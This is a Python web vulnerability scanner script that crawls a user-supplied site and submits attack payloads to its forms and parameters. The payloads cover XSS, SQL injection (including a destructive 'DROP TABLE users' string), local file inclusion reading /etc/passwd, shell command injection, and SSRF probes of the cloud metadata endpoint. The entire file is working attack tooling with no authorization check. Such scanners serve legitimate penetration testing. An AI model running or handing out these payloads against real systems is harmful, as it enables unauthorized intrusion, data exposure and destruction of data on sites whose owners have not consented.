import requests
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
from tqdm import tqdm
import time

xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(`XSS`)'>"
]

sql_payloads = [
    "' OR '1'='1",
    "' UNION SELECT NULL, NULL, NULL -- ",
    "' AND SLEEP(5) --",
    "\" OR \"\"=\"\"",
    "1; DROP TABLE users--",
    "admin' --"
]

lfi_payloads = [
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd"
]

rce_payloads = [
    ";id",
    "&& whoami",
    "| ls",
    "| powershell.exe"
]

sql_errors = [
    "SQL syntax", "mysql_fetch", "ORA-01756", "Microsoft OLE DB",
    "You have an error in your SQL syntax", "Warning: mysql", "Unclosed quotation mark"
]

def is_same_domain(url, base):
    return urlparse(url).netloc == urlparse(base).netloc

def get_all_forms(url):
    try:
        soup = BeautifulSoup(requests.get(url, timeout=5).content, "html.parser")
        return soup.find_all("form")
    except:
        return []

def get_all_links(url):
    links = set()
    try:
        soup = BeautifulSoup(requests.get(url, timeout=5).content, "html.parser")
        for tag in soup.find_all(['a', 'link', 'script', 'iframe'], href=True):
            full_url = urljoin(url, tag['href'])
            if is_same_domain(full_url, url):
                links.add(full_url.split('#')[0])
        for tag in soup.find_all(['form', 'input', 'button']):
            action = tag.get('action')
            if action:
                full_url = urljoin(url, action)
                if is_same_domain(full_url, url):
                    links.add(full_url.split('#')[0])
    except:
        pass
    return links

def submit_form(form, url, payload):
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all("input")
    data = {}

    for i in inputs:
        name = i.get("name")
        if name:
            if i.get("type") == "text" or i.get("type") is None:
                data[name] = payload
            else:
                data[name] = i.get("value", "")

    target_url = urljoin(url, action)

    try:
        if method == "post":
            res = requests.post(target_url, data=data, timeout=5)
        else:
            res = requests.get(target_url, params=data, timeout=5)
        return res
    except:
        return None

def scan_clickjacking(url):
    try:
        res = requests.get(url, timeout=5)
        if "X-Frame-Options" not in res.headers:
            return f"[Clickjacking] Vulnerability found: {url}"
    except:
        pass
    return "[Clickjacking] No vulnerability found."

def scan_idor(url):
    patterns = ["id=1", "uid=1", "user=1"]
    for pattern in patterns:
        test_url = f"{url}?{pattern}"
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200 and pattern in response.url:
                return f"[IDOR] Possible IDOR at: {test_url}"
        except:
            continue
    return "[IDOR] No vulnerability found."

def scan_csrf(url):
    forms = get_all_forms(url)
    for form in forms:
        if not form.find("input", attrs={"name": re.compile("csrf", re.IGNORECASE)}):
            return f"[CSRF] Missing CSRF token at: {url}"
    return "[CSRF] No vulnerability found."

def scan_ssrf(url):
    ssrf_payloads = [
        "/test?url=http://127.0.0.1:80",
        "/test?url=http://localhost:80",
        "/test?url=http://169.254.169.254/latest/meta-data/"
    ]
    for payload in ssrf_payloads:
        try:
            payload_url = urljoin(url, payload)
            response = requests.get(payload_url, timeout=5)
            if response.status_code == 200 and ("localhost" in response.text or "meta-data" in response.text):
                return f"[SSRF] Vulnerability found at: {payload_url}"
        except:
            continue
    return "[SSRF] No vulnerability found."

def scan_lfi(url):
    for payload in lfi_payloads:
        test_url = f"{url}?file={quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if "root:x" in response.text or "[extensions]" in response.text:
                return f"[LFI] Vulnerability found on {test_url}"
        except:
            continue
    return "[LFI] No vulnerability found."

def scan_rce(url):
    for payload in rce_payloads:
        test_url = f"{url}?cmd={quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if "uid=" in response.text or "root" in response.text:
                return f"[RCE] Vulnerability found on {test_url}"
        except:
            continue
    return "[RCE] No vulnerability found."

def scan_xss_on_page(url):
    forms = get_all_forms(url)
    for form in forms:
        for payload in xss_payloads:
            response = submit_form(form, url, payload)
            if response and payload in response.text:
                return f"[XSS] Vulnerability on {url} with payload: {payload}"
    return "[XSS] No vulnerability found."

def scan_sql_on_page(url):
    test_params = ["id", "user", "uid", "cat"]
    for param in test_params:
        for payload in sql_payloads:
            test_url = f"{url}?{param}={quote(payload)}"
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200 and any(err in response.text for err in sql_errors):
                    return f"[SQLi] Vulnerability on {test_url} with payload: {payload}"
            except:
                continue
    return "[SQLi] No vulnerability found."

def deep_crawl(start_url, max_depth=2):
    visited = set()
    to_visit = [(start_url, 0)]
    all_links = set()

    while to_visit:
        current_url, depth = to_visit.pop()
        if current_url in visited or depth > max_depth:
            continue
        visited.add(current_url)
        all_links.add(current_url)
        new_links = get_all_links(current_url)
        to_visit.extend((link, depth + 1) for link in new_links - visited)
    return all_links

def main():
    print("=== Web Scanner CLI ===")
    target_url = input("Enter target URL (http:// or https://): ").strip()
    if not target_url.startswith("http"):
        print("Invalid URL. Please include http:// or https://")
        return

    crawl_links = deep_crawl(target_url)
    print(f"Discovered {len(crawl_links)} URLs for scanning.")

    scanners = {
        "XSS": scan_xss_on_page,
        "SQL Injection": scan_sql_on_page,
        "Clickjacking": scan_clickjacking,
        "IDOR": scan_idor,
        "CSRF": scan_csrf,
        "SSRF": scan_ssrf,
        "LFI": scan_lfi,
        "RCE": scan_rce
    }

    results = []

    print("\nScanning started...\n")
    with tqdm(total=len(scanners) * len(crawl_links), desc="Scanning", ncols=100) as pbar:
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for link in crawl_links:
                for name, func in scanners.items():
                    futures[executor.submit(func, link)] = f"{name} on {link}"

            for future in as_completed(futures):
                scan_info = futures[future]
                try:
                    result = future.result()
                    print(f"[✓] {scan_info}")
                    results.append(result)
                except Exception as e:
                    print(f"[✗] {scan_info} failed: {e}")
                pbar.update(1)

    print("\n=== Scan Results ===")
    for result in results:
        print(result)

if __name__ == "__main__":
    main()
